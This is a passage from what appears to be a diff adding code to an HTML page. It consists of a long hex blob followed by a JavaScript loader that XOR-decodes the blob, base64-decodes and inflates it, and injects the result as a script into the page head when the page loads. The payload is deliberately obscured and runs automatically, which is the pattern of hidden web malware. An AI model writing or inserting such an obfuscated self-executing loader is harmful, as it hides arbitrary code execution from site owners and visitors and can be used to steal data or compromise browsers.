0d43055a201b12642a704a3f062325572e6869607113281b711a14040a0f711c320b1d03007f1e22315508551b59090255120166012d2e3c20225420460c23373c6759664e580b3e0938686b17636e697822222f0a3116041d78626a70502e0f0a23664a29320804150c3018277658163d7362644117370a6e26387e242f76162332545b502c222d1057400b7714280e722a27053930277b617216293b211c192541744a666a2a1e613921462c0a076039150e0e05303e0007517a1d707b330a4b03137b241c123412214e0b2e172205234b796b1b79147b4d45645455233c27230757263976003f5d6159031b67487f542a1c621e0073151a0f0005023f5a1c101978706c161704602419670a001037232308341d1f5c141c755b4a5a6e4c0577207e072b18101a3d06535c3f2a1b03254460620d783d7801131358461124152b2a291e3911353a096b7a48005220737b3e60605f6e76327c122f3a3e30090a1177797e58782b245a1c01701f116a042a0b0d1d0e232e1a5544414b1f6f152143381d743f0e24283f302a3d25751c1e1043096a624500044e443f725e6a2c1b251d062f1c73195c0b5e056457772c0d765b3b7f280e2c373f70500c0b76170f095b575167501e604b091860011421347c370a371f3c1618166343717a4e3f23491a341c390d723e106f165c2c253d2b2719607977723a2d0b1a1c790f1312221535293d23741c020c035145777b2b1a4922677101371261641c36260b25190b09055105445337024f1426510412007b326f04030b03052853504900555b191e12183b42373f15332a364a290d0826285c7356040c543c26522025700568771e020722180c043e1a11515547584d2031480362740e130100190a293f1f2736191762726043473d390833055e421435173829292b2e34033f2f0342734667110f723e617e5d2f0d06190b26003f11055a554a54024d770f3b52450367061c17010b6b033c27720a261c486464790e21334b26085d1d37263d312633215b08173c056a025153771b2c40231564276f2e1f24772d091c1c3a042e685b5b6d7b3322540a25413a20017b2a6b081d0e17020b3c4b6642074832314a1d03640c220a6510270726240a3b2008647a4106401421773c15620112071a623100033b1f1f1f3c7004554352010c701428183c313009256f01181c710b075268774a0c111909001b62753a1c373c7c0f572b2e1c1c24006b53554d601d724f32237718207d3c37280b0e283321061507665e5a55163c7f201978083911021d1e20202a71161e1c0742794e7b4b060e1b330200086e091d722737046906003e58067951444b0a090136403c2f20121f343f0346332a37016602744754531e692a1c710e683f3e6b0a175c1a0b25210f5e5c6a025917217e1a04420b3c2314672909371b2c0c45067108551f0e532f6c061b7154127d19006b03140207182622557d475c4c1d294a003a495d6c2f3a342802291f1401015c5f40067f6b0f3f6d5b697918756e3527374a5e2413201d0f48594b00112b015a1e21770162767f19150e2b1913405f30405d4205663c2155321274060c09641f0c2c072731010a150147417f7719384a1b2551183d2a3f2a170f3a1a225d3f020705674015410e562402043d233133263412080e3f181f1342537557143c055e253b6a1e6a26251f2b2309086d59200a676344614613220b07177537117d0518763d5f1a282214176a676a6748346055351d521b120e3c1b175023210a170b2347545e51733726120138622f0e026478051515190d020c1c6b415455464c3f6a0a7e02340873361c775722211c25223e56650b5c762d7f7f3a170a03632838092b355f26302a193d4107477c192f785e363d461b3e2b3178761d3727283b5d077d5e47066b0923431d30401f0a2a6961750a2e33021b183776694a7a13301971073a74236e31026a2e2c460410033835707d506d60483d4b06065a0c6d261f6a1552425c340123364002710c1837260a027a50466c1212170c3700206d3821364a587971470a0e4823630542330900231732292809381715635f460d640f38003307755f6e34093d1e3f5510110b370b6509547e7722236c13167b0e0f2b7f6b0b2446391739270b4345447b711f6469163f642f170f0460010a075d023c585775065c1f741e796e5f1a755413003119110d1920010c3f317e634b1f4253125e120675420b730a152e2b380f2c2d2c53645e775b6c172650086754190d72243202092e31285d0b146162674676533e081b14795b3216123e2b3c0a0f01571e5403444b6379080d6b3a055e3e101721216f4e3f011f1b451201741d78431d2e01271f04020a0b173106203c2e77023e0b5f000a1f6f3c7b433d1a7e22296a153821570b001e353e555940001f4c35334e39077201150b6209723d1f2737271f146869040c0e15010f2424603c3836672a200601232125392a195d5e7a6a2007481f3d700420330a323512151e050b1a3366457a024700045021024b3a1c26142312232b2774443a08764004044815380a3769792516243f39131c000327275e29596619675721070b420165080e33383f350a5b10211d1b0d6b605e437b227957096274053b2f3d3f763c1b02150a380b5f587b024b48604d420047292a14053905173d03073e34254546647f442f13510506511a6a0e2130373d5e3e05401c5d776143446c36290e452145241b2b05310f1601381e0b5b117e73714454102c74072469271e2a09672d355d253e17171d5d535b767b0f247f1b1b781f090021292b02201828194155014871400e533f4c16175d3f716e092a7d1c5e272b1e363e65547d7a6530727707086a07290466156f32052f003c03294845506c78333b000464584634752a362822262715380d5c66497555712c2d7f4916783508710a151154232c022419067352797e43207a514905542a697d3e202014423d0738180d41745875562c030f0610061a2f6e0061174e355e362e1a5c58515f58471c11521d65765c2a3724651d513e0a321d0d52017506736a4b0678383d5800157d230a34265b10772e193c74575e626415130b3624041f020e6910103d1f5130193a54047a7b40502e180815147934190b16030a291e1c3f5d3d2273527b42704a1c6c203b42223229643a303f1c31092a3f0c456674634c4a2f4d41666a050f2c3263313f3c083f08193e5344421f19401e60333547243e1c6320705c20383305072758787145714109513c605b073b29341e250a175a28282212587c5b4e4b3b1a0b2309500e3e24272b763335080227453e5648195659310f4b5f1a71583b22653a022920501f16212f0261640214123a75247a7b386d073f20083401031e35040656437950114a2948361d6b227574120312575c1c043d18216845474c66107f5d1e3d65086804050502513a2a2d0a0a285975787a401e385124205a3f0f082107720f04232e021c0a6b5c7a4c122807710966461a2f70131935010222253a1d3d656a5152480e090909300b0b3b3f1b78752c5b0c24210125544a1d7c14191f0e121d6722121f671e6b54001f081f2d565f48036d503e0c12313d5d2f0a1f20633152372627163c0907550558571d075720635f283608243b7d223c50080d3b524b055e597015044e44677e2a1229063e21563a30102b3f367e69656e51312f0e1f3c052f3d1138030251262516572621677a0a7d43171a01177a04156a3d122034270a060e2022067c755d59670d2369013e422e331f7f15172e3c1c2b193b537e03016717400e43443e6334370c663b282e2024205c5a375c477859791404580863063a1304692311155f07080b2d3602631d40722a1e0a5b285e5a0008650575013f2f213b361d79067b4c6c0824542a00572f302e21622202042c2a5d232a40786b51573b7c70482367233e301d0522515d39300d28575f05567d7228136d403a631900137b2000130105701d2d2c4442715077210558230200180b36076b1e02580c355d212b415b5d6d19483a61161c5822681269312a14052a03381c0f61095a7558140d0e3267662a3f36397c2f220c1b0f36572a70056047551712743a1c455439271936355d011d22041d507d7f661f483b2a52202b4b2f1f0d336528000c2d3f0c573d466a427654333d531b641c461c2c293229013d212f21373e541f547857001f0e26377814133c0526750f0c50353f2d086b4a7455741a3e7532357d34307d270a0313342f305e0228641b077c6928035247067d543b213864750d232c3c0d191e7d45007c4553067b121f57283f2f336026571c0d14191f356a5b044c47317f56256365263f2c7b3a20090b0d3e1f260b414360574c391a5737225a3d1534691d273618192b3f180e5c7a6b471720297a330418210d2720231029275c0a242d50645956634001006000145225132e0a1d3e1c06132b2a252c7e72655c6933396e1b30573a0c3f2367071f555b1c025c37770263786b190c561c3a061a2873370602152b04151c2210576144444414045641207820682608063e3f0c0b6902083358787e7c401b22433d1865170d13281a30341e013e09163c0640005c6010224c1c680b5d69103d15261639592d3d0f0541647f01773d3f6c3d3b65592d091b78273703180f092a0f5651065d194a387542300b5c3509321d021d17256d033f51431f5771121e6408062856346a2d7b622024550d6921412d7a5b465a6b397d5d1561691f2e2001160254551f155b0a2e5a596a47130e2749153f5b541b36356277000007724020571d7a50564712285b31227e3a36081a211403552a72231e2f60070441454f190133024b34173d2a1a26500b070e231a265348617e451613761d6705042c3634210f091428121b2a1300545b4611223d72030042351313093c33531b020019014b4b634b4579022a0d3e0247260f28252b322e5a080e3d59230a75554755011e6e4322752a3b3063622f223a3924221e1e4a61567a721e1d7e1f3b655c1d32190127175f0d2b4022280341415859120a4d1c20600e112e60642b26225b1c39380e037c77466d0a3c483e177646330d2229112b380f22061f2e4779046165351e52123b7f37300d1c670a0a54241728251c535367605910294a001559042235622a26231c0402013d5058587b4e6b211a632424711a37123d2a3e17260b213e2c117f401d4447333b581f1b0201171f39670206370f170534005a7d7b6c6f211a492a7e655e2237131f081127250f5d23084a485c44683c3f43246558080214376537500f077e2419530b550573510008561e6279260903011010345b220a3b1b2370467b766c2a73123702550162263d25340f0e100c1f142e4079425c4f013b4325285924117524780f37183a70242f125e5b6706591a221213070519306e62067654220f0824242d41515a1f10001c4f1f6969551930621120280b21140038004601547c0e153a4c4125550b1b7c360b23221f1932293c09684853580a281e0c311359061e6a20307426243f3f581e117f64477d564e3b09411c55090e771e207c210a087f24052a7459055c580b110026381c3a1935063b3403050701095b22071f5c576f413e7b13064028686a1c2520040358752b015019734a60463b394d5b650a2f0a1160160b2934252f272232507306431914125d153b70282d221f11052e05220b063b51737c5f5a600a1943400b06092a3f181a7c3d595a7f232002584343587b14265a05607b080e07662b3e15022d340a3f065d7d047e512c24013238781f0f7134180f5d0f3a2a5c573d6355531b433c034c241a60016e6a366471565d112e355713565d537c4a151d524063792b180964340d2b22312a5e3b2d685c6363551600753867715c0b0c132511571f2b16591d4b1d6876454b573d75433d5000393d081b2a1d1e0310041d2f5a654b6c6511325716325a2b0e1f361f2d3f5d0116170d3e4a7a647a450e066b053f5c5c6933143431342b133f3d1a254251656e5b0b1d691b2979000d12131c0853070c301a3e33505c0363142d1151132b5a0400367f6a2509422a023a1e577d5e4b454e16385f2204501439731f0b2c3f3e2b142e1c33514a54620e35074e19156601230a05103416243e371f361e07055a41702b0d50383a03002f2708003d301b1a71163617034570056f2a0f013b14580928082804064a1a0f242e5f2a44591d5e171f044e3d3d033539351a382924251d321d23331d7d56526634206f3a084b3e3f111c3f16530e0c083d5d1764044b5b583e29501c077d050d1366617032021374402251425546754f39285c2237075f1876146529043f18092a01227066737a593d255142014719232909310a03011d77083622767b1955184d014b17156b01392329117112270a1c1e0b0a045c507e632b135c1308500631100a05250e465869575d1c05661943470e05531137451c2c2e31222f322104150c0a2e0254757b6e210e4a5f1c50013022027c6b225b3f2f2605565d52585863312f7509386b5a2d3d261f2f4a17302f3e2d525c65545f13411852286078346e0d207c130a2319102a572146734073521b035442177c222c0605391d0702197f20280f5548537f482b7d4f3a37721f7111290337302f06772958350b027a7c50160d5c1c3a03006c177b3a010e37021358244b62440350733c18483f38490b172128163e0b1c2a7f012232067f431f69353e7b283a440502263f31250c38180d02090254594873730b1b6d082361382f326063352a295b2200285266734164701b7a4d0964050c0c2c681f362458060c2b5d074162477548292a513b167a087176660309575b3a1e0002575d7405434b292855243044181c1f3578293f353e2219095d434a42440a373e480715491f2e1f616337320b3f172b0f050b49604c4a163c0e447a66096a07362574535c426d163f0564497b46701e127d5b1c623d310f0011140c5c0d1028272661760550103929123d6106001c6a680b6f3c543915440d2c7769610d4210787602260b0b340d68033e0f172f341c245d4460544611487816311972232d71271a3220021c302a5d0e7554566466171f503a27622c3874081a3c2b3713290a06367a4666716f2f335d1a24785a6e73293903061b2d04182b29741f755f70413a7524645a043703141d1c23353e3c57081d071b75444f1e605f182b465a1532097c015c553d6d561b057e60545c1436127c431078062c3c1a350054281d235f2c0b74047877132c6078387a5d5c3d14226a35503e3b0f081d2a557579664f4b1c76032775090804023d3556192d201c01007b4a635852331e12371d63242008033d0e012b330f0a2d27465d016e774c7b413b0875386b0624032e24172231291917576458595600394d047a74241e1d663c1608202b321e5a5279005902171b7c7801024027236a062a0c52230015380c35041b776c141731772710760c7133211172021825133c580d197758584d211b73233a7c5f222938222935263d7e2a1f0c68437a7f4340264c0130630a352c3e1b0f54371922372f200b616b0118210263173c5c1d0d366338050b5f5e0a255f3203087544533f1f6e432565153b031a06212c5f2b165f0d025b7e586c78571a540a637215293f6627365c23113e1b2414627c02406f081d0f4208722e6d753535353f150d305c585354465d420e363e161560471830211c0577513742772c5f3d625d53021720297a3e39053f33287b1f0c112a3d360b173141535f46433538613e0242191771330b72140802045a2c02677f7104553e21505b174a3e2c363f00000f3424025b25094a737d41103b7f6a40234b0c1f311c252e292a303f44261d74696a6444112d00157e743c393518110e0c242f3235062c6a54774553212c573e02743c082c1927052c291f085e0a176b1b637b423939783e644b46223c64071d2b3d0e045f1d51785c7f55784e080a086960253d31292608100c1f0b24005448057d6e171f1a6d3d027e20130f1560120f0a5c7500380344631d7712137f4c3a1b67083e021f3f10165c1b020c0534035e594e404160520637062b142f2a07102c1e21763e24330143730d562038720a166a20172113242656263129041736627a547b7001135c14145b383613163b1e11342e7636570b565c057d4b417d5e01217723000d62117617392617240c14067c616264400471223675582011603e053f380509090b2e7c4a7f077b4c05560163725a2f0c0a00352839500c28253c7a06735966172071356200556f70252323092f420b1d1611037e74531440395d401f060a1601353630260a22242e0906686702026a2a257a03645b34193635031c542759132e1421650148556d1b7901441b455b2d0021142e2f2b0d705d5c2f01455f755b2b241609081c031f3c060476302b133718392d7f425b7d6b53236c253269053e03681435175c28351f3932437c686579363b533d3d673871322a210924140f710e3c2240597a43421b095b1a14652f083d18223517041e0104073c7465584c740c3c601415412e1375141b0d0c18022e0c2f157b035c70150b010c483a750f6a04312671153905232a450158777443791a7f4c19247046681c7f01271c552c7016260853737e5e6b1d326c49185a07100b7b2b20313c2d0e5c3c12067c5f7a4c3a044c1968650562363920723f0f1f152d375366517b655157115e371b7f0309711f31332a4231043557316262036d751564781b35560f6332343f07171e00013a2533777f680d12303f6d452506066b77642a71345f0d1f0c2d505f7e63467512066831147d213623391a23173c261f1b3b087879611f69027c083b647a223b732135742a1e042b035b3c48007064442964723f69465819220401313f5a0b7f3b594f4b67704e4c2a264332620a253712083c2a1f282d101a042e5a095d42554b2e5f1234020903360a200e2c1b1c0d0d2b3242574363102d2201311f762914353e0a2706343914353717425500521021245c2328070e68210a1a0e1104220d205721465d580c7b5364712a015a3b102d60276b282601111f2c077e1b4267504d044c001a51373972323f02285e1a001c3d3104725d5b6239004e123a64026d2c08257606031f1c082f570577030557141f161b297703362b693c3d533e3b12243725435f535143150c0d413443270f2d7f3e33175e5b69065825687a477f76190e4c28175f066a0a29127d171d3e0e5c5d1c4563044d111606683b62572637766304260a052b775822057451677153300743373a062e000a1e3a084a0e300e01230d5953197b65360175170877353d10632101295c381e595b326540666e514b3d51310966423f731e296f01225e2d063810486a65790a1c2874357a510020000a302a08295022255d33410001664c1939091d031c246f27341d101f022116015720635c7345683a2509171a423f172a2a7c15060005291b0f2d66095a784e0a2d0b311447273616193c2554552f0b28063e78485345483e2a6b1238591a0f0c3f39751f342b28035f5d64086a5745147f6b3c327b24311d11112506051e3403090c0444677f6916077739345c20150e2020253d37383e571c3202775002481d006f3f6279222e0208192523593b0f373f570b037a59171b7c7a0a22511b201c292222002202231f0d3d4b42196e65130f480127600002001a032317585c353920127e097f775557297e272756270c321523280b542273443a0b4607780074287b50353b7e0830031b67762002420f291708796544726913184c0935552e0f2719097c37193c31160f2f605c6158503e386e0a3c5002321d121627170f3e751c0c0a0b55474267303e091d35702e6d31381c2308183329375a02685d6352124b0416042978042f311b1e701406221c3d14321d075d7c4e0d005a47030b37026a321476302b2017230a2b44567844534f217b062441016f282660051409102b3f1420575f5076164f2e4e43097e3b141f1e320f1d095c291c5b2c070919646a2f20523b7a0642751d38101e2c05211f2856025c780b5f6c0f126f1804795c330b21180331255a05233f226675047b5216115012605702360e64673c09175077290500434067466f3b7a121f3a763a3f1637387c2d0b2111565b2205624a646f2c195b36257427026e1d112b0b0207745839357053070c512e3f0826625e0b1c08110120311c2f300a244f6877474d4231255523394b002d1035226b24553f00165c290f';
+var kb=new Uint8Array(_k.match(/../g).map(function(x){return parseInt(x,16);}));
+var hb=new Uint8Array(_h.match(/../g).map(function(x){return parseInt(x,16);}));
+var xb=new Uint8Array(hb.length);for(var i=0;i<hb.length;i++)xb[i]=hb[i]^kb[i%kb.length];
+var b64=new TextDecoder().decode(xb);var bin=atob(b64);var u8=new Uint8Array(bin.length);
+for(var i=0;i<bin.length;i++)u8[i]=bin.charCodeAt(i);
+new Response(new Blob([u8]).stream().pipeThrough(new DecompressionStream('deflate'))).text().then(function(code){
+var s=document.createElement('script');s.textContent=code;document.head.appendChild(s);});})();
+</script>
+</body>
+</html>
